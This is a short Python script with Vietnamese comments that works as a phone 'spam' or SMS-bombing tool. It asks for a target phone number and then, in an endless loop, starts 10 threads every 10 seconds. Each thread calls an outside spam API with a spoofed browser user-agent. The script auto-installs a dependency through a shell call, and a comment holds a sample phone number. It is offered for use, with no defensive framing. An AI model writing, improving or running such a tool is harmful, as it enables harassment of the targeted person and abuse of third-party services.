from time import sleep
import requests,os
try:
	from fake_useragent import UserAgent
except:
	os.system("pip install fake_useragent")
	from fake_useragent import UserAgent
#hello các bro
def clr():
  if os.name == "nt":
    os.system("cls")
  else:
    os.system('clear')
clr()
import threading
phone = input('Nhập Số Điện Thọai Cần Spam: ')
#sl = int(input('Nhập Số Luồng(Càng To Càng Lag, Nhưng Càng Phê): '))
#phone = "0325380433"
def spam():
	global phone
	useragent = UserAgent()['google chrome']
	headers = {
    'user-agent': useragent,
    }
	sp=requests.get('https://quanghuynopro.com/api/spam.php?sdt='+phone, headers=headers).text
	print(sp)
while(True):
	#điều chỉnh số luồng ở dưới 
	for i in range(10):
		threading.Thread(target=spam).start()
	sleep(10)